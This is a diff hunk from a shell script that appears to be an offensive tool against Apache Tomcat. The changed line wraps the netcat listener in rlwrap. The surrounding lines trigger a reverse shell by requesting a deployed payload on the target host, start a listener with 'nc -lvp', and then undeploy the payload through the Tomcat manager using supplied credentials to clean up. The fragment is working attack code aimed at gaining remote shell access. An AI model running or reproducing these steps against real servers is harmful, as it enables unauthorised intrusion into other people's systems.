@@ -101,7 +101,7 @@ echo -e $Y"\n[!] Triggering Reverse Shell...\n"$W
 sleep 5 && curl http://$RHOST:$RPORT/$FNAME/ &> /dev/null &
 
 echo -e $G"[+]$C Starting Listener..."$W
-nc -lvp $LPORT
+rlwrap nc -lvp $LPORT
 
 echo -e $Y"\n[!] Cleaning Up..."$W
 curl -u $USER:$PASS http://$RHOST:$RPORT/manager/text/undeploy?path=/$FNAME
